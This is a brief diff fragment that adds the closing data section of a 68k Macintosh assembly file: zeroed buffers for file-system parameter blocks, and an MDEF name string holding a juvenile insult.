+    DCB.B    temp+2,0
+theSpec
+    DCB.B    70,0
+CInfoPB
+    DCB.B    108,0
+HParamBlock
+    DCB.B    122,0
+theName
+    DCB.B    64,0
+MDEFName
+    DC.B     25,'You are a big stupid jerk'
+EndLabel
+    ENDMAIN
+    END
